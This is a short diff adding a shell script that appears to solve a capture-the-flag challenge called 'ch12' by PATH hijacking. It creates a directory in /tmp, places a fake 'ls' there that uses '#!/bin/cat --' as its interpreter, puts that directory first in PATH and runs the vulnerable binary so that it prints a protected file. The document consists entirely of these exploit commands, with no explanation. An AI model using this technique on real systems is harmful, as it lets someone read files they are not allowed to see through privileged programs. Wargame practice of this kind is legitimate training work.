@@ -1,0 +1,9 @@
+mkdir /tmp/gbourgeo4 && cd /tmp/gbourgeo4
+echo '#!/bin/cat --' > /tmp/gbourgeo4/ls
+chmod 777 ls
+export PATH=/tmp/gbourgeo4:$PATH
+cd
+./ch12
+
+DONE!
+
